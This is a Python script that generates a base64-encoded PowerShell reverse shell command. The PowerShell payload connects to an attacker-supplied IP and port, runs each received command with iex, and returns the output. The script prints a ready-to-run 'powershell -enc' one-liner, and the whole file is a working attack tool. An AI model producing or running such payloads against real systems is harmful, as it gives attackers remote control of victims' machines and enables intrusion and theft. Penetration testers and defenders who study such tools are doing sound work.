#!/usr/bin/python3
from base64 import b64encode

def generate_payload(ip: str, port: int):
    payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});"
    payload += """$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()"""
    return payload

if __name__ == "__main__":
    from lib.prog import *
    prog = Prog(
        "gen_pwsh_rshell",
        "Generates a Powershell Base64-encoded payload.", [
            Arg(ArgType.POSITIONAL, "ip", arg_val_type=str, arg_help="IP address of reverse shell"),
            Arg(ArgType.POSITIONAL, "port", arg_val_type=int, arg_help="Port of reverse shell")
        ]
    )
    payload = generate_payload(prog.args["ip"], int(prog.args["port"]))
    payload_b = payload.encode("utf-16le")  # pwsh uses utf-16 little endian
    payload_enc = b64encode(payload_b).decode()
    print(f"powershell -enc {payload_enc}")
    
